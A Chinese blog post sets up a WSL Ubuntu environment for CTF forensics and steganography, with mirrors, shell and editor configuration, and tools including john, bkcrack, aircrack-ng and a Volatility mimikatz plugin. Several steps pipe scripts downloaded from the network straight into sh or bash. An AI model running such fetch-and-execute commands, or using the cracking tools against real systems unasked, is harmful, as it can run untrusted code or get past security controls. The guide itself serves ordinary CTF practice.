        <content type="html"><![CDATA[<h1 id="1-切换root账户"><a href="#1-切换root账户" class="headerlink" title="1.切换root账户"></a>1.切换root账户</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line">ubuntu.exe config --default-user root</span><br></pre></td></tr></table></figure><br><h1 id="2-换源"><a href="#2-换源" class="headerlink" title="2.换源"></a>2.换源</h1><p>链接：<a href="https://mirrors.ustc.edu.cn/help/ubuntu.html">https://mirrors.ustc.edu.cn/help/ubuntu.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码仓库，如有需要可自行取消注释</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"># 预发布软件源，不建议启用</span><br><span class="line"># deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"># deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade</span><br></pre></td></tr></table></figure><br><h1 id="3-使用代理"><a href="#3-使用代理" class="headerlink" title="3.使用代理"></a>3.使用代理</h1><p>参考教程：<a href="https://www.cnblogs.com/tuilk/p/16287472.html">https://www.cnblogs.com/tuilk/p/16287472.html</a></p><br><h1 id="4-安装oh-my-zsh-zinit"><a href="#4-安装oh-my-zsh-zinit" class="headerlink" title="4.安装oh-my-zsh zinit"></a>4.安装oh-my-zsh zinit</h1><ol><li>安装zsh</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install zsh</span><br></pre></td></tr></table></figure><ol start="2"><li>安装ohmyzsh</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>安装zinit</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/zdharma-continuum/zinit/HEAD/scripts/install.sh)&quot;</span><br></pre></td></tr></table></figure><br><h1 id="5-配置python"><a href="#5-配置python" class="headerlink" title="5.配置python"></a>5.配置python</h1><ol><li>安装<code>pip3</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install pip</span><br></pre></td></tr></table></figure><ol start="2"><li>安装<code>python2</code>和<code>pip2</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install python2</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py &amp;&amp; sudo python2 get-pip.py &amp;&amp; <span class="built_in">rm</span> get-pip.py</span><br></pre></td></tr></table></figure><br><p>问题1：<code>ERROR: Could not install packages due to an EnvironmentError: Missing dependencies for SOCKS support.</code></p><p>先关闭代理，安装pysocks就好了，再开启代理就不会出现了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install pysocks &amp;&amp; pip3 install pysocks</span><br></pre></td></tr></table></figure><br><h1 id="6-卸载vim替换neovim"><a href="#6-卸载vim替换neovim" class="headerlink" title="6.卸载vim替换neovim"></a>6.卸载vim替换neovim</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove vim</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:neovim-ppa/stable</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install neovim </span><br></pre></td></tr></table></figure><ol><li>安装<code>vim-plug</code></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&#x27;curl -fLo &quot;$&#123;XDG_DATA_HOME:-$HOME/.local/share&#125;&quot;/nvim/site/autoload/plug.vim --create-dirs \</span></span><br><span class="line"><span class="string">       https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>配置<code>init.vim</code></li></ol><p>创建的文件在<code>/root/.config/nvim/init.vim</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root &amp;&amp; mkdir .config &amp;&amp; cd .config &amp;&amp; mkdir nvim &amp;&amp; cd nvim &amp;&amp; vim init.vim</span><br></pre></td></tr></table></figure><ol start="3"><li>安装<code>nodejs</code></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sL install-node.vercel.app/lts | bash</span><br></pre></td></tr></table></figure><ol start="4"><li>安装<code>coc.nvim</code></li></ol><p>使用nvim打开<code>init.vim</code>, 命令行输入:<code>:PlugInstall</code></p><br><h1 id="7-软连接"><a href="#7-软连接" class="headerlink" title="7.软连接"></a>7.软连接</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~ &amp;&amp; ln -s /mnt/c/Users/97766/Desktop Desktop</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~ &amp;&amp; ln -s /mnt/c/Users/97766/Downloads/Compressed/wsl wsl</span><br></pre></td></tr></table></figure><br><h1 id="8-设置ls颜色"><a href="#8-设置ls颜色" class="headerlink" title="8.设置ls颜色"></a>8.设置ls颜色</h1><p>参考链接：<a href="https://blog.csdn.net/qq_43743126/article/details/118530641?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167094670416782429710545%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=167094670416782429710545&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-118530641-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=ubuntu%20ls%E6%98%BE%E7%A4%BA%E7%BB%BF%E8%89%B2&spm=1018.2226.3001.4187">戳我打开!</a></p><br><h1 id="9-安装库"><a href="#9-安装库" class="headerlink" title="9.安装库"></a>9.安装库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install python-tk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install opencv-python==4.1.1.26 pillow matplotlib pycryptodome</span><br><span class="line">pip3 install opencv-python hexdump pillow matplotlib pycryptodome</span><br></pre></td></tr></table></figure><br><h1 id="10-zsteg"><a href="#10-zsteg" class="headerlink" title="10.zsteg"></a>10.zsteg</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby-full rubygems -y &amp;&amp; gem install zsteg</span><br></pre></td></tr></table></figure><br><h1 id="11-zbar-tools-pngcheck"><a href="#11-zbar-tools-pngcheck" class="headerlink" title="11.zbar-tools pngcheck"></a>11.zbar-tools pngcheck</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加下面两行到最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><p><strong>问题：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">警告：</span><br><span class="line"> The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpg --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gpg --export --armor ED444FF07D8D0BF6 | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>再次apt update就没错了，千万不要使用<strong>apt upgrade</strong>，不然会给你升级成kali，然后你大部分东西都会开始报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install zbar-tools pngcheck</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zbarimg --version</span><br><span class="line"># 0.23.92</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pngcheck</span><br><span class="line"># PNGcheck, version 3.0.3 of 25 April 2021,</span><br></pre></td></tr></table></figure><br><h1 id="12-steghide-outguess-exiftool-imagemagick-binwalk-foremost-dtmf2num-morse2ascii-minimodem-aircrack-ng"><a href="#12-steghide-outguess-exiftool-imagemagick-binwalk-foremost-dtmf2num-morse2ascii-minimodem-aircrack-ng" class="headerlink" title="12.steghide outguess exiftool imagemagick binwalk foremost dtmf2num morse2ascii minimodem aircrack-ng"></a>12.steghide outguess exiftool imagemagick binwalk foremost dtmf2num morse2ascii minimodem aircrack-ng</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install steghide outguess exiftool imagemagick binwalk foremost dtmf2num morse2ascii minimodem aircrack-ng</span><br></pre></td></tr></table></figure><br><h1 id="13-stegseek"><a href="#13-stegseek" class="headerlink" title="13.stegseek"></a>13.stegseek</h1><p>下载deb：<a href="https://github.com/RickdeJager/stegseek/releases/tag/v0.6">https://github.com/RickdeJager/stegseek/releases/tag/v0.6</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ./stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure><br><h1 id="14-stegpy"><a href="#14-stegpy" class="headerlink" title="14.stegpy"></a>14.stegpy</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install stegpy</span><br></pre></td></tr></table></figure><br><h1 id="15-Volatility"><a href="#15-Volatility" class="headerlink" title="15.Volatility"></a>15.Volatility</h1><ol><li>安装distorm3</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vext01/distorm3 &amp;&amp; cd distorm3 &amp;&amp; python2 setup.py install</span><br></pre></td></tr></table></figure><ol start="2"><li>安装需要的库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install yara openpyxl ujson construct</span><br></pre></td></tr></table></figure><ol start="3"><li>软连接<code>libyara.so</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/lib/python2.7/dist-packages/usr/lib/libyara.so /usr/lib/libyara.so</span><br></pre></td></tr></table></figure><ol start="4"><li><p>安装<code>mimikatz</code>插件</p></li><li><p>查看<code>volatility</code>的安装目录</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /usr -name &#x27;volatility&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>进入插件目录</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd plugins</span><br></pre></td></tr></table></figure><ol start="3"><li>使用wget去github下载并命名为<code>mimikatz.py</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/ruokeqx/tool-for-CTF/master/volatility_plugins/mimikatz.py &gt;&gt; mimikatz.py</span><br></pre></td></tr></table></figure><br><h1 id="16-john-1-9-0-jumbo-1"><a href="#16-john-1-9-0-jumbo-1" class="headerlink" title="16.john-1.9.0-jumbo-1"></a>16.john-1.9.0-jumbo-1</h1><p>在<code>/doc/INSTALL-UBUNTU</code>目录可以看到安装过程，如果出现编译环境问题。<br>参考链接：<a href="https://blog.csdn.net/hry1314/article/details/106426006/">https://blog.csdn.net/hry1314/article/details/106426006/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aptitude</span><br><span class="line">sudo aptitude install lib6c-dev</span><br><span class="line">先输入n，再输入2次y即可。</span><br><span class="line">sudo apt install build-essential</span><br></pre></td></tr></table></figure><br><ol><li>make -s clean &amp;&amp; make -sj4出现下面报错。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">warning: #warning &quot;zlib missing, Electrum formats not built&quot; [-Wcpp]</span><br><span class="line"> 496 | #warning &quot;zlib missing, Electrum formats not built&quot;</span><br></pre></td></tr></table></figure><p>根据提示也知道是zlib的缺失，其实是因为install前的环境包没有安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">=== 前提条件和必要条件</span><br><span class="line"></span><br><span class="line">    mkdir -p ~/src</span><br><span class="line">    sudo apt-get -y install build-essential libssl-dev git zlib1g-dev</span><br><span class="line"></span><br><span class="line">==== 推荐(额外的格式和性能)</span><br><span class="line"></span><br><span class="line">    sudo apt-get -y install yasm libgmp-dev libpcap-dev pkg-config libbz2-dev</span><br><span class="line"></span><br><span class="line">==== 如果你有一个NVIDIA的GPU（支持OpenCL）</span><br><span class="line"></span><br><span class="line">    sudo apt-get -y install nvidia-opencl-dev</span><br></pre></td></tr></table></figure><br><ol start="2"><li>当使用 <code>perl 7z2john.pl &lt;7z-zip&gt;</code> 时候会出现以下报错</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can&#x27;t locate Compress/Raw/Lzma.pm in @INC (you may need to install the Compress::Raw::Lzma module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.36.0 /usr/local/share/perl/5.36.0 /usr/lib/x86_64-linux-gnu/perl5/5.36 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.36 /usr/share/perl/5.36 /usr/local/lib/site_perl) at john-1.9.0-jumbo-1/run/7z2john.pl line 6.</span><br><span class="line">BEGIN failed--compilation aborted at john-1.9.0-jumbo-1/run/7z2john.pl line 6.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是因为没有安装lzma，在终端输入 sudo cpan -I Compress::Raw::Lzma</span><br></pre></td></tr></table></figure><p>如果报错，则需要安装<code>apt install liblzma-dev</code></p><br><h1 id="17-minimodem"><a href="#17-minimodem" class="headerlink" title="17.minimodem"></a>17.minimodem</h1><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230204203520452.png" alt="image-20230204203520452"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230204203531975.png" alt="image-20230204203531975"></p><p><strong>指令为minimodem –rx -f encoded.wav 1200 ，–rx或者-r均可，为指定读取模式;-f为读取文件;1200为bell202 bps对应参数，直接得到flag</strong></p><br><h1 id="18-kimci86-x2F-bkcrack"><a href="#18-kimci86-x2F-bkcrack" class="headerlink" title="18.kimci86&#x2F;bkcrack"></a>18.kimci86&#x2F;bkcrack</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz &amp;&amp; tar xf bkcrack-1.5.0-Linux.tar.gz</span><br></pre></td></tr></table></figure><p>配置变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias bkcrack=&#x27;/root/WSL/bkcrack-1.5.0-Linux/bkcrack&#x27;</span><br></pre></td></tr></table></figure><br><h1 id="19-emojicode"><a href="#19-emojicode" class="headerlink" title="19.emojicode"></a>19.emojicode</h1><ol><li>安装依赖库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libncurses5</span><br></pre></td></tr></table></figure><ol start="2"><li>下载emojicode-release并安装</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/emojicode/emojicode/releases/download/v1.0-beta.2/Emojicode-1.0-beta.2-Linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>解压后运行：<code>install.sh</code></p><ol start="3"><li>编译</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emojidec xxx.emojic</span><br></pre></td></tr></table></figure><ol start="4"><li>运行</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xxx</span><br></pre></td></tr></table></figure><h1 id="常见问题："><a href="#常见问题：" class="headerlink" title="常见问题："></a>常见问题：</h1><h2 id="oh-my-zsh主题目录太长"><a href="#oh-my-zsh主题目录太长" class="headerlink" title="oh-my-zsh主题目录太长"></a>oh-my-zsh主题目录太长</h2><p><code>vim /root/.local/share/zinit/snippets/OMZT::agnoster</code></p><p>改成下面图片的样子后最多显示3层目录</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20221218204811216.png" alt="image-20221218204811216"></p><br><h2 id="ldconfig-x2F-usr-x2F-lib-x2F-wsl-x2F-lib-x2F-libcuda-so-1-is-not-a-symbolic-link"><a href="#ldconfig-x2F-usr-x2F-lib-x2F-wsl-x2F-lib-x2F-libcuda-so-1-is-not-a-symbolic-link" class="headerlink" title="ldconfig: &#x2F;usr&#x2F;lib&#x2F;wsl&#x2F;lib&#x2F;libcuda.so.1 is not a symbolic link"></a>ldconfig: &#x2F;usr&#x2F;lib&#x2F;wsl&#x2F;lib&#x2F;libcuda.so.1 is not a symbolic link</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原因: /usr/lib/wsl/lib/目录下都是文件而不是链接，且该目录只读，需要在其他目录操作</span><br></pre></td></tr></table></figure><p><strong>解决办法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/wsl</span><br><span class="line">sudo mkdir lib2</span><br><span class="line">sudo ln -s lib/* lib2</span><br><span class="line"># 更改wsl配置文件</span><br><span class="line">sudo vim /etc/ld.so.conf.d/ld.wsl.conf</span><br><span class="line"># 将 /usr/lib/wsl/lib 改为 /usr/lib/wsl/lib2</span><br><span class="line"># 测试修改是否生效</span><br><span class="line">sudo ldconfig</span><br><span class="line"># 永久修改</span><br><span class="line">vim /etc/wsl.conf</span><br><span class="line">[automount]</span><br><span class="line">ldconfig = false</span><br></pre></td></tr></table></figure><p>作者：等待是一种选择 <a href="https://www.bilibili.com/read/cv16415980/">https://www.bilibili.com/read/cv16415980/</a> 出处：bilibili</p><br><h2 id="Failed-to-connect-to-socket-x2F-run-x2F-dbus-x2F-system-bus-socket-No-such-file-or-directory"><a href="#Failed-to-connect-to-socket-x2F-run-x2F-dbus-x2F-system-bus-socket-No-such-file-or-directory" class="headerlink" title="Failed to connect to socket &#x2F;run&#x2F;dbus&#x2F;system_bus_socket: No such file or directory)"></a>Failed to connect to socket &#x2F;run&#x2F;dbus&#x2F;system_bus_socket: No such file or directory)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt intsall dbus</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /etc/init.d/dbus start</span><br></pre></td></tr></table></figure><br><h1 id="个人配置："><a href="#个人配置：" class="headerlink" title="个人配置："></a>个人配置：</h1><h3 id="x2F-root-x2F-config-x2F-nvim-x2F-init-vim"><a href="#x2F-root-x2F-config-x2F-nvim-x2F-init-vim" class="headerlink" title="&#x2F;root&#x2F;.config&#x2F;nvim&#x2F;init.vim"></a><strong>&#x2F;root&#x2F;.config&#x2F;nvim&#x2F;init.vim</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">syntax on</span><br><span class="line">set ts=4</span><br><span class="line">set expandtab</span><br><span class="line">set number</span><br><span class="line">set relativenumber</span><br><span class="line">set ignorecase</span><br><span class="line">set nowrap</span><br><span class="line"></span><br><span class="line">let g:coc_global_extensions = [&quot;coc-json&quot;, &quot;coc-python&quot;, &quot;coc-vimlsp&quot;, &quot;coc-tsserver&quot;]</span><br><span class="line"></span><br><span class="line">call plug#begin()</span><br><span class="line">Plug &#x27;neoclide/coc.nvim&#x27;, &#123;&#x27;branch&#x27;: &#x27;release&#x27;&#125;</span><br><span class="line">Plug &#x27;rakr/vim-one&#x27;</span><br><span class="line">Plug &#x27;itchyny/lightline.vim&#x27;</span><br><span class="line">Plug &#x27;preservim/nerdcommenter&#x27;</span><br><span class="line">call plug#end()</span><br><span class="line"></span><br><span class="line">let g:airline_theme=&#x27;one&#x27;</span><br><span class="line"></span><br><span class="line">&quot;Credit joshdick</span><br><span class="line">&quot;Use 24-bit (true-color) mode in Vim/Neovim when outside tmux.</span><br><span class="line">&quot;If you&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;s 24-bit color support</span><br><span class="line">&quot;(see &lt; http://sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span><br><span class="line">if (empty($TMUX))</span><br><span class="line">  if (has(&quot;nvim&quot;))</span><br><span class="line">    &quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span><br><span class="line">    let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span><br><span class="line">  endif</span><br><span class="line">  &quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span><br><span class="line">  &quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span><br><span class="line">  &quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span><br><span class="line">  if (has(&quot;termguicolors&quot;))</span><br><span class="line">    set termguicolors</span><br><span class="line">  endif</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set background=dark &quot; for the dark version</span><br><span class="line">&quot; set background=light &quot; for the light version</span><br><span class="line">colorscheme one</span><br><span class="line"></span><br><span class="line">set hidden</span><br><span class="line">set updatetime=100</span><br><span class="line">set shortmess+=c</span><br><span class="line"></span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span><br><span class="line">      \ coc#pum#visible() ? coc#pum#next(1):</span><br><span class="line">      \ CheckBackspace() ? &quot;\&lt;Tab&gt;&quot; :</span><br><span 